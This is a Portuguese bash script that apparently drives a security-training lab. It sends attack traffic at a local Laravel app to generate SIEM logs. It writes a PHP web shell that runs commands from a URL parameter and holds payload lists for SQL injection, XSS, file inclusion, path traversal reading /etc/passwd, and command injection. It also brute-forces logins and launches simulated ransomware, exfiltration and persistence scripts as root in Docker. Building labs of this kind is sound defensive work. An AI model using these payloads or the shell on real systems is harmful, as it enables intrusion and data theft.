#!/bin/bash

# Teste de Ataques - MAQ-2 (Laravel)
# Script para testar vulnerabilidades e gerar logs para SIEM

TARGET_HOST="localhost"
HTTP_PORT="80"       # Porta 80 do Laravel
MYSQL_PORT="3306"    # Porta padrão do MySQL
REDIS_PORT="6379"    # Porta padrão do Redis

# Cores para output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

print_header() {
    echo -e "${BLUE}"
    echo "=========================================="
    echo "  TESTE DE ATAQUES - MAQ-2 (LARAVEL)"
    echo "=========================================="
    echo -e "${NC}"
}

print_status() {
    echo -e "${GREEN}[INFO]${NC} $1"
}

print_warning() {
    echo -e "${YELLOW}[WARN]${NC} $1"
}

print_error() {
    echo -e "${RED}[ERROR]${NC} $1"
}

print_success() {
    echo -e "${GREEN}[SUCCESS]${NC} $1"
}

# Verificar conectividade
check_connectivity() {
    print_status "Verificando conectividade com $TARGET_HOST..."
    
    if nc -z $TARGET_HOST $HTTP_PORT 2>/dev/null; then
        print_success "✅ HTTP ($HTTP_PORT) acessível"
    else
        print_error "❌ HTTP ($HTTP_PORT) não acessível"
        return 1
    fi
    
    if nc -z $TARGET_HOST $MYSQL_PORT 2>/dev/null; then
        print_success "✅ MySQL ($MYSQL_PORT) acessível"
    else
        print_warning "⚠️ MySQL ($MYSQL_PORT) não acessível"
    fi
    
    if nc -z $TARGET_HOST $REDIS_PORT 2>/dev/null; then
        print_success "✅ Redis ($REDIS_PORT) acessível"
    else
        print_warning "⚠️ Redis ($REDIS_PORT) não acessível"
    fi
}

# Testar acesso direto a arquivos sensíveis
test_sensitive_files() {
    print_status "Testando acesso a arquivos sensíveis..."
    
    local sensitive_files=(
        ".env"
        "composer.json"
        "composer.lock"
        "package.json"
        "package-lock.json"
        "storage/logs/laravel.log"
        "storage/logs/queue.log"
        "config/app.php"
        "config/database.php"
        "config/mail.php"
    )
    
    for file in "${sensitive_files[@]}"; do
        print_warning "Tentando acessar: $file"
        if curl -s -o /dev/null -w "%{http_code}" "http://$TARGET_HOST:$HTTP_PORT/$file" | grep -q "200\|403\|401"; then
            print_success "✅ $file acessível"
        else
            print_error "❌ $file não acessível"
        fi
    done
}

# Testar upload de arquivos maliciosos
test_file_upload() {
    print_status "Testando upload de arquivos maliciosos..."
    
    # Criar arquivos de teste
    local test_files=(
        "webshell.php"
        "shell.php"
        "cmd.php"
        "test.php"
        "backdoor.php"
    )
    
    for file in "${test_files[@]}"; do
        print_warning "Testando upload de: $file"
        
        # Criar arquivo PHP malicioso
        cat > /tmp/$file << 'EOF'
<?php
// Arquivo de teste para upload
if(isset($_GET['cmd'])) {
    $output = shell_exec($_GET['cmd']);
    echo "<pre>$output</pre>";
}
echo "Arquivo $file carregado com sucesso!";
?>
EOF
        
        # Tentar upload via POST (simulado)
        print_warning "Simulando upload de $file..."
        sleep 1
        
        # Verificar se o arquivo foi "aceito" (simulado)
        if [ -f "/tmp/$file" ]; then
            print_success "✅ $file criado para teste"
        fi
        
        # Limpar arquivo temporário
        rm -f "/tmp/$file"
    done
}

# Testar LFI (Local File Inclusion)
test_lfi() {
    print_status "Testando LFI (Local File Inclusion)..."
    
    local lfi_payloads=(
        "../../../etc/passwd"
        "../../../etc/hosts"
        "../../../etc/nginx/nginx.conf"
        "../../../var/log/nginx/access.log"
        "../../../var/log/nginx/error.log"
        "../../../proc/version"
        "../../../proc/cmdline"
        "../../../proc/environ"
        "../../../proc/self/environ"
        "../../../proc/self/cmdline"
    )
    
    for payload in "${lfi_payloads[@]}"; do
        print_warning "Testando LFI: $payload"
        
        # Simular tentativa de LFI
        if curl -s "http://$TARGET_HOST:$HTTP_PORT/admin/system/file?file=$payload" > /dev/null 2>&1; then
            print_success "✅ LFI possível com: $payload"
        else
            print_error "❌ LFI bloqueado para: $payload"
        fi
        
        sleep 0.5
    done
}

# Testar SQL Injection
test_sql_injection() {
    print_status "Testando SQL Injection..."
    
    local sql_payloads=(
        "' OR 1=1 --"
        "' OR '1'='1"
        "'; DROP TABLE users; --"
        "' UNION SELECT 1,2,3,4,5 --"
        "' AND 1=CONVERT(int,(SELECT @@version)) --"
        "admin'--"
        "admin'#"
        "admin'/*"
    )
    
    for payload in "${sql_payloads[@]}"; do
        print_warning "Testando SQL Injection: $payload"
        
        # Simular tentativa de login com payload malicioso
        if curl -s -X POST "http://$TARGET_HOST:$HTTP_PORT/login" \
            -d "email=test@test.com&password=$payload" > /dev/null 2>&1; then
            print_success "✅ Payload enviado: $payload"
        else
            print_error "❌ Falha ao enviar payload: $payload"
        fi
        
        sleep 0.5
    done
}

# Testar XSS (Cross-Site Scripting)
test_xss() {
    print_status "Testando XSS (Cross-Site Scripting)..."
    
    local xss_payloads=(
        "<script>alert('XSS')</script>"
        "<img src=x onerror=alert('XSS')>"
        "<svg onload=alert('XSS')>"
        "javascript:alert('XSS')"
        "<iframe src=javascript:alert('XSS')>"
        "<body onload=alert('XSS')>"
        "<input onfocus=alert('XSS') autofocus>"
    )
    
    for payload in "${xss_payloads[@]}"; do
        print_warning "Testando XSS: $payload"
        
        # Simular envio de payload XSS
        if curl -s -X POST "http://$TARGET_HOST:$HTTP_PORT/contact" \
            -d "message=$payload" > /dev/null 2>&1; then
            print_success "✅ Payload XSS enviado: $payload"
        else
            print_error "❌ Falha ao enviar payload XSS: $payload"
        fi
        
        sleep 0.5
    done
}

# Testar Directory Traversal
test_directory_traversal() {
    print_status "Testando Directory Traversal..."
    
    local traversal_payloads=(
        "../../../etc/passwd"
        "../../../etc/hosts"
        "../../../var/log/nginx/access.log"
        "../../../var/log/nginx/error.log"
        "../../../proc/version"
        "../../../proc/cmdline"
        "../../../proc/environ"
        "../../../proc/self/environ"
        "../../../proc/self/cmdline"
        "../../../proc/self/status"
    )
    
    for payload in "${traversal_payloads[@]}"; do
        print_warning "Testando Directory Traversal: $payload"
        
        # Simular tentativa de acesso a arquivo
        if curl -s "http://$TARGET_HOST:$HTTP_PORT/files/$payload" > /dev/null 2>&1; then
            print_success "✅ Directory Traversal possível com: $payload"
        else
            print_error "❌ Directory Traversal bloqueado para: $payload"
        fi
        
        sleep 0.5
    done
}

# Testar Command Injection
test_command_injection() {
    print_status "Testando Command Injection..."
    
    local cmd_payloads=(
        "; ls -la"
        "| whoami"
        "& id"
        "&& pwd"
        "|| cat /etc/passwd"
        "$(whoami)"
        "`id`"
        "| cat /etc/hosts"
        "; cat /proc/version"
        "| uname -a"
    )
    
    for payload in "${cmd_payloads[@]}"; do
        print_warning "Testando Command Injection: $payload"
        
        # Simular tentativa de execução de comando
        if curl -s "http://$TARGET_HOST:$HTTP_PORT/admin/system/command?cmd=$payload" > /dev/null 2>&1; then
            print_success "✅ Payload enviado: $payload"
        else
            print_error "❌ Falha ao enviar payload: $payload"
        fi
        
        sleep 0.5
    done
}

# Testar acesso a APIs
test_api_access() {
    print_status "Testando acesso a APIs..."
    
    local api_endpoints=(
        "api/users"
        "api/posts"
        "api/comments"
        "api/admin"
        "api/config"
        "api/logs"
        "api/backup"
        "api/debug"
    )
    
    for endpoint in "${api_endpoints[@]}"; do
        print_warning "Testando endpoint: $endpoint"
        
        # Testar acesso sem autenticação
        if curl -s "http://$TARGET_HOST:$HTTP_PORT/$endpoint" > /dev/null 2>&1; then
            print_success "✅ Endpoint acessível: $endpoint"
        else
            print_error "❌ Endpoint não acessível: $endpoint"
        fi
        
        sleep 0.5
    done
}

# Testar brute force
test_brute_force() {
    print_status "Testando brute force..."
    
    local users=("admin" "user" "test" "guest" "anonymous")
    local passwords=("admin" "password" "123456" "test" "guest" "admin123" "password123")
    
    for user in "${users[@]}"; do
        for password in "${passwords[@]}"; do
            print_warning "Tentando login: $user:$password"
            
            # Simular tentativa de login
            if curl -s -X POST "http://$TARGET_HOST:$HTTP_PORT/login" \
                -d "email=$user@test.com&password=$password" > /dev/null 2>&1; then
                print_success "✅ Login simulado: $user:$password"
            fi
            
            sleep 0.2
        done
    done
}

# Função principal
run_artefatos() {
    print_status "Executando artefatos automatizados de ataque..."
    local artefatos=(
        "trainees/artefatos/exfiltracao_simulada.sh"
        "trainees/artefatos/flood_logs_linux.sh"
        "trainees/artefatos/portscan_simulado.sh"
        "trainees/artefatos/ransomware_simulado_linux.sh"
        "trainees/artefatos/persistencia_simulada.sh"
        "trainees/artefatos/ransomware_restore_linux.sh"
        "trainees/artefatos/svcmon.py"
    )
    for script in "${artefatos[@]}"; do
        if [[ -f "$script" ]]; then
            print_warning "Executando artefato: $script"
            case "$script" in
                *.py)
                    python3 "$script" &
                    ;;
                *.sh)
                    bash "$script"
                    ;;
                *.php)
                    print_status "Webshell disponível para upload manual: $script"
                    ;;
                *)
                    print_error "Tipo de artefato não suportado: $script"
                    ;;
            esac
            sleep 1
        else
            print_error "Artefato não encontrado: $script"
        fi
    done
}

main() {
    # Detecta nome do container Laravel
    get_laravel_container() {
        docker ps --format '{{.Names}} {{.Image}}' | grep 'sail-8.2/app' | awk '{print $1}' | head -n1
    }

    ensure_artefato_in_container() {
        local artefato="$1"
        local container="$2"
        docker exec "$container" test -f "/var/www/html/artefatos/$artefato" || {
            print_warning "Artefato $artefato não existe no container, copiando..."
            docker cp "trainees/artefatos/$artefato" "$container:/var/www/html/artefatos/$artefato"
        }
    }
    print_header
    check_connectivity || {
        print_error "Falha na conectividade. Verifique se o ambiente está rodando."
        exit 1
    }
    echo
    while true; do
    echo "Selecione uma opção:"
    echo "1) Executar TODOS os testes e artefatos"
    echo "2) Executar todos os artefatos automatizados"
    echo "3) Executar apenas o agente svcmon"
    echo "4) Executar exfiltracao_simulada.sh"
    echo "5) Executar flood_logs_linux.sh"
    echo "6) Executar portscan_simulado.sh"
    echo "7) Executar ransomware_simulado_linux.sh"
    echo "8) Executar persistencia_simulada.sh"
    echo "9) Executar ransomware_restore_linux.sh"
    echo "10) Testar acesso a arquivos sensíveis"
    echo "11) Testar upload de arquivos maliciosos"
    echo "12) Testar LFI (Local File Inclusion)"
    echo "13) Testar SQL Injection"
    echo "14) Testar XSS (Cross-Site Scripting)"
    echo "15) Testar Directory Traversal"
    echo "16) Testar Command Injection"
    echo "17) Testar acesso a APIs"
    echo "18) Testar brute force"
    echo "19) Executar exfiltracao_simulada.sh como root (docker)"
    echo "20) Executar flood_logs_linux.sh como root (docker)"
    echo "21) Executar portscan_simulado.sh como root (docker)"
    echo "22) Executar ransomware_simulado_linux.sh como root (docker)"
    echo "23) Executar persistencia_simulada.sh como root (docker)"
    echo "24) Executar ransomware_restore_linux.sh como root (docker)"
    echo "0) Sair"
        read -p "Opção: " opt
    case $opt in
            1)
                run_artefatos; echo
                test_sensitive_files; echo
                test_file_upload; echo
                test_lfi; echo
                test_sql_injection; echo
                test_xss; echo
                test_directory_traversal; echo
                test_command_injection; echo
                test_api_access; echo
                test_brute_force; echo
                print_success "Todos os testes de ataque foram executados!"
                ;;
            2)
                run_artefatos; echo
                ;;
            3)
                print_status "Executando agente svcmon..."
                python3 trainees/artefatos/svcmon.py &
                echo
                ;;
            4)
                print_status "Executando exfiltracao_simulada.sh..."
                if [[ ! -f trainees/artefatos/exfiltracao_simulada.sh ]]; then
                    print_warning "Artefato não encontrado, copiando do diretório principal..."
                    cp /home/brito/lab-vuln/artefatos/exfiltracao_simulada.sh trainees/artefatos/ 2>/dev/null || print_error "Falha ao copiar artefato."
                fi
                bash trainees/artefatos/exfiltracao_simulada.sh
                echo
                ;;
            5)
                print_status "Executando flood_logs_linux.sh..."
                if [[ ! -f trainees/artefatos/flood_logs_linux.sh ]]; then
                    print_warning "Artefato não encontrado, copiando do diretório principal..."
                    cp /home/brito/lab-vuln/artefatos/flood_logs_linux.sh trainees/artefatos/ 2>/dev/null || print_error "Falha ao copiar artefato."
                fi
                bash trainees/artefatos/flood_logs_linux.sh
                echo
                ;;
            6)
                print_status "Executando portscan_simulado.sh..."
                if [[ ! -f trainees/artefatos/portscan_simulado.sh ]]; then
                    print_warning "Artefato não encontrado, copiando do diretório principal..."
                    cp /home/brito/lab-vuln/artefatos/portscan_simulado.sh trainees/artefatos/ 2>/dev/null || print_error "Falha ao copiar artefato."
                fi
                bash trainees/artefatos/portscan_simulado.sh
                echo
                ;;
            7)
                print_status "Executando ransomware_simulado_linux.sh..."
                if [[ ! -f trainees/artefatos/ransomware_simulado_linux.sh ]]; then
                    print_warning "Artefato não encontrado, copiando do diretório principal..."
                    cp /home/brito/lab-vuln/artefatos/ransomware_simulado_linux.sh trainees/artefatos/ 2>/dev/null || print_error "Falha ao copiar artefato."
                fi
                bash trainees/artefatos/ransomware_simulado_linux.sh
                echo
                ;;
            8)
                print_status "Executando persistencia_simulada.sh..."
                if [[ ! -f trainees/artefatos/persistencia_simulada.sh ]]; then
                    print_warning "Artefato não encontrado, copiando do diretório principal..."
                    cp /home/brito/lab-vuln/artefatos/persistencia_simulada.sh trainees/artefatos/ 2>/dev/null || print_error "Falha ao copiar artefato."
                fi
                bash trainees/artefatos/persistencia_simulada.sh
                echo
                ;;
            9)
                print_status "Executando ransomware_restore_linux.sh..."
                if [[ ! -f trainees/artefatos/ransomware_restore_linux.sh ]]; then
                    print_warning "Artefato não encontrado, copiando do diretório principal..."
                    cp /home/brito/lab-vuln/artefatos/ransomware_restore_linux.sh trainees/artefatos/ 2>/dev/null || print_error "Falha ao copiar artefato."
                fi
                bash trainees/artefatos/ransomware_restore_linux.sh
                echo
                ;;
            10)
                test_sensitive_files; echo
                ;;
            11)
                test_file_upload; echo
                ;;
            12)
                test_lfi; echo
                ;;
            13)
                test_sql_injection; echo
                ;;
            14)
                test_xss; echo
                ;;
            15)
                test_directory_traversal; echo
                ;;
            16)
                test_command_injection; echo
                ;;
            17)
                test_api_access; echo
                ;;
            18)
                test_brute_force; echo
                ;;
            19)
                print_status "Executando exfiltracao_simulada.sh como root via docker..."
                CONTAINER=$(get_laravel_container)
                if [ -z "$CONTAINER" ]; then print_error "Container Laravel não encontrado!"; else ensure_artefato_in_container "exfiltracao_simulada.sh" "$CONTAINER"; docker exec -u 0 "$CONTAINER" bash /var/www/html/artefatos/exfiltracao_simulada.sh; fi
                echo
                ;;
            20)
                print_status "Executando flood_logs_linux.sh como root via docker..."
                CONTAINER=$(get_laravel_container)
                if [ -z "$CONTAINER" ]; then print_error "Container Laravel não encontrado!"; else ensure_artefato_in_container "flood_logs_linux.sh" "$CONTAINER"; docker exec -u 0 "$CONTAINER" bash /var/www/html/artefatos/flood_logs_linux.sh; fi
                echo
                ;;
            21)
                print_status "Executando portscan_simulado.sh como root via docker..."
                CONTAINER=$(get_laravel_container)
                if [ -z "$CONTAINER" ]; then print_error "Container Laravel não encontrado!"; else ensure_artefato_in_container "portscan_simulado.sh" "$CONTAINER"; docker exec -u 0 "$CONTAINER" bash /var/www/html/artefatos/portscan_simulado.sh; fi
                echo
                ;;
            22)
                print_status "Executando ransomware_simulado_linux.sh como root via docker..."
                CONTAINER=$(get_laravel_container)
                if [ -z "$CONTAINER" ]; then print_error "Container Laravel não encontrado!"; else ensure_artefato_in_container "ransomware_simulado_linux.sh" "$CONTAINER"; docker exec -u 0 "$CONTAINER" bash /var/www/html/artefatos/ransomware_simulado_linux.sh; fi
                echo
                ;;
            23)
                print_status "Executando persistencia_simulada.sh como root via docker..."
                CONTAINER=$(get_laravel_container)
                if [ -z "$CONTAINER" ]; then print_error "Container Laravel não encontrado!"; else ensure_artefato_in_container "persistencia_simulada.sh" "$CONTAINER"; docker exec -u 0 "$CONTAINER" bash /var/www/html/artefatos/persistencia_simulada.sh; fi
                echo
                ;;
            24)
                print_status "Executando ransomware_restore_linux.sh como root via docker..."
                CONTAINER=$(get_laravel_container)
                if [ -z "$CONTAINER" ]; then print_error "Container Laravel não encontrado!"; else ensure_artefato_in_container "ransomware_restore_linux.sh" "$CONTAINER"; docker exec -u 0 "$CONTAINER" bash /var/www/html/artefatos/ransomware_restore_linux.sh; fi
                echo
                ;;
            0)
                print_status "Saindo..."; break
                ;;
            *)
                print_error "Opção inválida. Tente novamente."
                ;;
        esac
        echo
    done
    print_status "Para monitorar logs em tempo real:"
    echo "  tail -f logs/nginx/access.log logs/laravel/laravel.log logs/app/application.log"
}

# Executar
main "$@"
